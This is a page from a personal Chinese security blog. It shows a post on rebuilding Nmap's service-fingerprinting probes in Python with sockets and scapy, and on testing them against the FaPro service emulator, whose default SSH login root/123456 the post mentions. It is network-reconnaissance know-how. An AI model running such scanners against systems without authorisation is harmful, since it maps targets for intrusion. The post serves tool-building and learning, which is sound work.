<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#B0C4DE" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#B0C4DE" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 5.4.2">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#B0C4DE">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://lib.baomitu.com/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://lib.baomitu.com/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"c4ooc0.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.13.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="永怀谦卑与求知欲">
<meta property="og:type" content="website">
<meta property="og:title" content="c4ooc0个人博客">
<meta property="og:url" content="https://c4ooc0.github.io/page/2/index.html">
<meta property="og:site_name" content="c4ooc0个人博客">
<meta property="og:description" content="永怀谦卑与求知欲">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="c4ooc0">
<meta property="article:tag" content="安全 瞎折腾">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://c4ooc0.github.io/page/2/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/2/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>c4ooc0个人博客</title>
  






  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">c4ooc0个人博客</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">半吊子的安全工程师，ACG爱好者</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="c4ooc0"
      src="/images/images.jpg">
  <p class="site-author-name" itemprop="name">c4ooc0</p>
  <div class="site-description" itemprop="description">永怀谦卑与求知欲</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">10</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/c4ooc0" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;c4ooc0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.yuque.com/choocolate-yqwd/blog" title="语雀 → https:&#x2F;&#x2F;www.yuque.com&#x2F;choocolate-yqwd&#x2F;blog" rel="noopener" target="_blank">语雀</a>
      </span>
  </div>


  <div class="links-of-blogroll site-overview-item animated">
    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
      友友们
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://blog.c1ker.top/" title="https:&#x2F;&#x2F;blog.c1ker.top&#x2F;" rel="noopener" target="_blank">ciker</a>
        </li>
    </ul>
  </div>

        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://c4ooc0.github.io/2022/07/19/Nmap%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB%E6%8C%87%E7%BA%B9%E5%BA%93%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/images.jpg">
      <meta itemprop="name" content="c4ooc0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="c4ooc0个人博客">
      <meta itemprop="description" content="永怀谦卑与求知欲">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | c4ooc0个人博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/07/19/Nmap%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB%E6%8C%87%E7%BA%B9%E5%BA%93%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">Nmap服务识别指纹库利用</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-07-19 18:12:16" itemprop="dateCreated datePublished" datetime="2022-07-19T18:12:16+08:00">2022-07-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-11-17 10:46:07" itemprop="dateModified" datetime="2022-11-17T10:46:07+08:00">2022-11-17</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>1.9k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>7 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>指纹库：</p>
<p>json 化方法：</p>
<h1 id="nmap-服务检测流量分析"><a class="markdownIt-Anchor" href="#nmap-服务检测流量分析"></a> Nmap 服务检测流量分析</h1>
<p>client 131 server130 端口[80,3306]，在 client 上运行 nmap，命令：<code>nmap -sC -sV -p 80,3306 192.168.42.130</code>
通信流量例子：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fn9fegmoXqic9Zbv3HoqAfwYrmWp.png" alt="" />
在 nmap 运行的 client 上会根据目标端口个数启用自身端口与之通信，例如目标端口[80,3306]，client 33776 端口和 server 80 端口通信，client 56362 和 server 3306 端口通信，每个端口依次开始通信的时间会间隔大约 1s，可以并行实现，提高检测速度。</p>
<h1 id="服务检测原理分析"><a class="markdownIt-Anchor" href="#服务检测原理分析"></a> 服务检测原理分析</h1>
<p>以 80 端口为例:
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FtDnEsJPkNbCIkESmM6-PaUBTX0C.png" alt="" />
下面是一个最简单的探针（probe）的通信流程：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FhSk-BC04Nty0UXQkNwcSwWmjJAy.svg" alt="" />基本就是先 TCP 三次握手，然后发探针，根据响应的内容，与指纹库中的 pattern 匹配，即可完成服务识别。
然后是一个复杂的探针：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Ft9P8YLkjGTupxGhL5wW96g3hTT8.png" alt="" />
和它的流量：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FlTwWmy8KOfL-xYR8gV4uTWJTZaP.png" alt="" />
可以看到 TCP 协议加上“probestring”的内容就变成 http 包了，之后的数据通信依旧是 TCP 包，最后响应是 http 包。</p>
<h1 id="实现过程"><a class="markdownIt-Anchor" href="#实现过程"></a> 实现过程</h1>
<h3 id="tcp-探针"><a class="markdownIt-Anchor" href="#tcp-探针"></a> tcp 探针</h3>
<p>下面是 json 格式指纹库中的一个 tcp 探针例子：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">       <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TCP&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;probename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GetRequest&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;probestring&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET / HTTP/1.0\\r\\n\\r\\n&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;ports&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">           <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">           .......</span><br><span class="line">           <span class="string">&quot;8080-8085&quot;</span><span class="punctuation">,</span></span><br><span class="line">           .......</span><br><span class="line">       <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;sslports&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">           .......</span><br><span class="line">           <span class="string">&quot;60443&quot;</span></span><br><span class="line">       <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;totalwaitms&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;tcpwrappedms&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;rarity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;fallback&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;matches&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">           <span class="punctuation">&#123;</span></span><br><span class="line">               <span class="attr">&quot;pattern&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^&lt;\\?xml version=\\\&quot;1\\.0\\\&quot;\\?&gt;\\r\\n&lt;!DOCTYPE cross-domain-policy SYSTEM \\\&quot;/xml/dtds/cross-domain-policy\\.dtd\\\&quot;&gt;\\r\\n&lt;cross-domain-policy&gt;\\r\\n    &lt;!-- This is a master socket policy file --&gt;\\r\\n    &lt;!-- No other socket policies on the host will be permitted --&gt;\\r\\n    &lt;site-control permitted-cross-domain-policies=\\\&quot;master-only\\\&quot;/&gt;\\r\\n    &lt;!-- This will allow access to port 1800 --&gt;\\r\\n    &lt;allow-access-from domain=\\\&quot;([^\\\&quot;]*)\\\&quot; to-ports=\\\&quot;([^\\\&quot;]*)\\\&quot;/&gt;\\r\\n&lt;/cross-domain-policy&gt;\\r\\n&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;adobe-crossdomain&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;pattern_flag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;versioninfo&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                   <span class="attr">&quot;cpename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;h:snom:870&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;devicetype&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VoIP phone&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;hostname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Snom 870 VoIP phone; domain: $1; ports: $2&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;operatingsystem&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;vendorproductname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Adobe cross-domain policy&quot;</span><span class="punctuation">,</span></span><br><span class="line">                   <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">               <span class="punctuation">&#125;</span></span><br><span class="line">           <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   ......</span><br></pre></td></tr></table></figure>
<p>&quot;protocol&quot;指定走 TCP 还是 UDP，&quot;probestring&quot;指定携带的 payload。只要目标端口在 ports 里，就可以使用该探针进行测试，根据响应内容，使用 pattern 进行正则匹配，匹配成功就可以得到服务名称，甚至是服务版本了。</p>
<ul>
<li>方法一 构造 TCP 包</li>
</ul>
<p>使用 scapy 包实现三次握手是可行的，但是在实现过程中，需要精心构造 tcp 协议的各个字段，否则就会出现下面这张图的场景：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FpChNN70xKPetCpnY_Z5Zpxo5ZnV.png" alt="" /></p>
<p>这里面 TCP 的错误提示全部遇到过，观察 nmap 的流量，可以看到其 tcp 协议中的 options 字段如下：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fp_pxRf1x6CcM3ZE8PCvipJf5edA.png" alt="" /></p>
<p>推测缺少某些关键的可选字段是 TCP 协议经常报错的主要原因。虽然不影响服务 mysql 的检出，该服务的探针位于指纹库首位，而且该探针没有 payload，比较特殊，所以该方法不一定对其他服务也生效。</p>
<ul>
<li>方法 2 socket 连接</li>
</ul>
<p>一个流式 socket 连接首先会进行 tcp 三次握手，符合要求，然后再发送探针，接收数据即可。
值得注意的是，http 探针的 probestring：<code>&quot;GET / HTTP/1.0\\r\\n\\r\\n&quot;</code>，后面的<code>\r\n</code>转二进制没有被正确解码，需要自己添加。
或者我写了个探针转字节码的函数，感觉有点累赘，但可以规避其他错误（\0 转义等）：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">def probestr2bytes(probe)<span class="punctuation">:</span></span><br><span class="line">    probe = probe.split(<span class="string">&quot;\\&quot;</span>)</span><br><span class="line">    # 拆开类似这样&#x27;x07version&#x27;的字符串</span><br><span class="line">    for sub in probe<span class="punctuation">:</span></span><br><span class="line">        if len(sub) &gt; <span class="number">3</span><span class="punctuation">:</span></span><br><span class="line">            if sub<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span> == <span class="string">&quot;x&quot;</span> and len(sub) &gt; <span class="number">3</span><span class="punctuation">:</span></span><br><span class="line">                sub1 = <span class="punctuation">[</span>sub<span class="punctuation">[</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">]</span><span class="punctuation">]</span></span><br><span class="line">                sub2 = <span class="punctuation">[</span>sub<span class="punctuation">[</span><span class="number">3</span><span class="punctuation">:</span><span class="punctuation">]</span><span class="punctuation">]</span></span><br><span class="line">                idx = probe.index(sub)</span><br><span class="line">                probe = probe<span class="punctuation">[</span><span class="punctuation">:</span>idx<span class="punctuation">]</span> + sub1 + sub2 + probe<span class="punctuation">[</span>idx + <span class="number">1</span><span class="punctuation">:</span><span class="punctuation">]</span></span><br><span class="line">    # 转字节码，有&#x27;x72&#x27;，&#x27;version&#x27;，&#x27;<span class="number">0</span>&#x27;，&#x27;r&#x27;<span class="punctuation">,</span> &#x27;n&#x27;，四种类型</span><br><span class="line">    result_bytes = b&#x27;&#x27;</span><br><span class="line">    for sub in probe<span class="punctuation">:</span></span><br><span class="line">        if len(sub) &gt; <span class="number">0</span><span class="punctuation">:</span></span><br><span class="line">            # &#x27;x72&#x27;</span><br><span class="line">            if sub<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span> == <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span></span><br><span class="line">                # print(int(sub<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">:</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="number">16</span>))</span><br><span class="line">                result_bytes += bytes(<span class="punctuation">[</span>int(sub<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">:</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="number">16</span>)<span class="punctuation">]</span>)</span><br><span class="line">            # &#x27;<span class="number">0</span>&#x27;空字符</span><br><span class="line">            elif sub == <span class="attr">&quot;0&quot;</span><span class="punctuation">:</span></span><br><span class="line">                result_bytes += &#x27;\<span class="number">0</span>&#x27;.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            elif sub == <span class="attr">&quot;r&quot;</span><span class="punctuation">:</span></span><br><span class="line">                result_bytes += &#x27;\r&#x27;.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            elif sub == <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span></span><br><span class="line">                result_bytes += &#x27;\n&#x27;.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            else<span class="punctuation">:</span></span><br><span class="line">                result_bytes += sub.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    return result_bytes</span><br></pre></td></tr></table></figure>
<p>成功识别成 http 协议:
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FnvqZrCoydXnttQzUPMBSFqRjvxP.png" alt="" /></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">for string in port_TCP_padding<span class="punctuation">[</span>port<span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line">    # print(<span class="string">&quot;start TCP probe&quot;</span> + string<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span>)</span><br><span class="line">    # 三次握手</span><br><span class="line">    try<span class="punctuation">:</span></span><br><span class="line">        s = socket.socket()</span><br><span class="line">        s.connect((ip<span class="punctuation">,</span> port))</span><br><span class="line">        # 使用scapy库中的sr系列函数收包</span><br><span class="line">        ss = StreamSocket(s<span class="punctuation">,</span> Raw)</span><br><span class="line">        # # 响应包数据文件不会很大，所以只收一个响应包即可，使用sr1</span><br><span class="line">        response = ss.sr1(Raw(probestr2bytes(string<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span>))<span class="punctuation">,</span> timeout=<span class="number">0.5</span><span class="punctuation">,</span> verbose=<span class="number">0</span>)</span><br><span class="line">        s.close()</span><br><span class="line">        if response<span class="punctuation">:</span></span><br><span class="line">            # 遍历匹配表达式</span><br><span class="line">            for match in string<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line">                if re.match(pattern=match<span class="punctuation">[</span><span class="string">&quot;pattern&quot;</span><span class="punctuation">]</span>.encode(&#x27;utf<span class="number">-8</span>&#x27;)<span class="punctuation">,</span> string=response<span class="punctuation">[</span>Raw<span class="punctuation">]</span>.load)<span class="punctuation">:</span></span><br><span class="line">                    # 输出结果</span><br><span class="line">                    info = str(port) + <span class="string">&quot; &quot;</span> + match<span class="punctuation">[</span><span class="string">&quot;name&quot;</span><span class="punctuation">]</span></span><br><span class="line">                    print(info)</span><br><span class="line">    except Exception as e<span class="punctuation">:</span></span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
<p>扫描结果：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fl9dxqs5tRy3ArNCEX4uhdLhMhMS.png" alt="" /></p>
<h3 id="udp-探针"><a class="markdownIt-Anchor" href="#udp-探针"></a> udp 探针</h3>
<p>这个地方深坑，一开始使用 scapy 实现收发 udp 包，但是发现 scapy 收不到 udp 的响应包，而在 wireshark 里一切正常，自制扫描器与 nmap 扫描的流量基本一致，关了防火墙也是如此。上网搜索原因，未果，放弃。
遂继续使用 socket 库实现收发功能，一切正常。值得注意的是，需要设置 timeout，要不然没有响应包就会一直卡在接收函数上。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">for string in port_UDP_padding<span class="punctuation">[</span>port<span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line">    ANY = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    # 创建UDP socket</span><br><span class="line">    s = socket.socket(socket.AF_INET<span class="punctuation">,</span> socket.SOCK_DGRAM<span class="punctuation">,</span> socket.IPPROTO_UDP)</span><br><span class="line">    # 允许端口复用</span><br><span class="line">    s.setsockopt(socket.SOL_SOCKET<span class="punctuation">,</span> socket.SO_REUSEADDR<span class="punctuation">,</span> <span class="number">1</span>)</span><br><span class="line">    # 绑定监听多播数据包的端口</span><br><span class="line">    s.bind((ANY<span class="punctuation">,</span> port))</span><br><span class="line">    s.sendto(probestr2bytes(string<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span>)<span class="punctuation">,</span> (ip<span class="punctuation">,</span> port))</span><br><span class="line">    s.settimeout(<span class="number">1</span>)</span><br><span class="line">    try<span class="punctuation">:</span></span><br><span class="line">        data<span class="punctuation">,</span> address = s.recvfrom(<span class="number">2048</span><span class="punctuation">,</span> )</span><br><span class="line">    except Exception as e<span class="punctuation">:</span></span><br><span class="line">        pass</span><br><span class="line">    else<span class="punctuation">:</span></span><br><span class="line">        for match in string<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span><span class="punctuation">:</span></span><br><span class="line">            if re.match(pattern=match<span class="punctuation">[</span><span class="string">&quot;pattern&quot;</span><span class="punctuation">]</span>.encode(&#x27;utf<span class="number">-8</span>&#x27;)<span class="punctuation">,</span> string=data)<span class="punctuation">:</span></span><br><span class="line">                info = str(port) + <span class="string">&quot; &quot;</span> + match<span class="punctuation">[</span><span class="string">&quot;name&quot;</span><span class="punctuation">]</span></span><br><span class="line">                print(info)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
<h2 id="测试过程"><a class="markdownIt-Anchor" href="#测试过程"></a> 测试过程</h2>
<h3 id="搭建测试环境-fapro"><a class="markdownIt-Anchor" href="#搭建测试环境-fapro"></a> 搭建测试环境 fapro</h3>
<p>FaPro 是一个服务端协议模拟工具,可以轻松启停多个网络服务。用来测试服务扫描工具，显然比自己一个一个安装方便很多。
下载地址：<a target="_blank" rel="noopener" href="https://github.com/fofapro/fapro">https://github.com/fofapro/fapro</a>
环境建议：用 Win8 或 win10，试了 win7 提示 Windows 版本太低，win11 莫名报错；Linux 下开 fapro 上的服务显示端口占用，没找到解决方法，一不开心就给你 error 退出。以下测试在 win10 虚拟机里跑 fapro，win11 物理机上跑 nmap 和自制扫描器。
在 releases 中下载可执行文件：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FkFftulHhJXTHxLHmtyWDFx0EKVP.png" alt="" />
拖到虚拟机里，在 fapro 的目录下打开终端，输入命令：
<code>fapro genConfig &gt; fapro.json</code>
得到配置 json 文件，这一步我 win11 和 win10 都试过，发现该文件是 utf-16 的编码，fapro 识别不了会报错（也很离谱），可以用 notepad++转成 utf-8 编码。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FneZutK7thpTkXEk07IatulsGlWV.png" alt="" />
输入运行命令：
<code>fapro run -v -l :8080</code>
浏览器中打开本机 ip:8080 即可看到配置界面：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FtMFi_hK02smLq0IFBoIax3susEp.png" alt="" />
选择相应的服务，点击“+New”开启，可以在跑 fapro 的终端里看到日志信息：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FoeFVsRmbLF7bEdP8UyR6Aa9GTWB.png" alt="" />
如果这一步显示报错某个端口已经占用了，可以修改 fapro.json 文件中对应的端口。
简单试一下 ssh 服务（默认账号 root/123456）：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FlnADP3RTC7TlUuwZB_gVmhUDpT8.png" alt="" />
fapro 对应输出：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FjrDoeOzF9v_4EGg9tnIYRojv6Ll.png" alt="" />
这样环境就搭好了。</p>
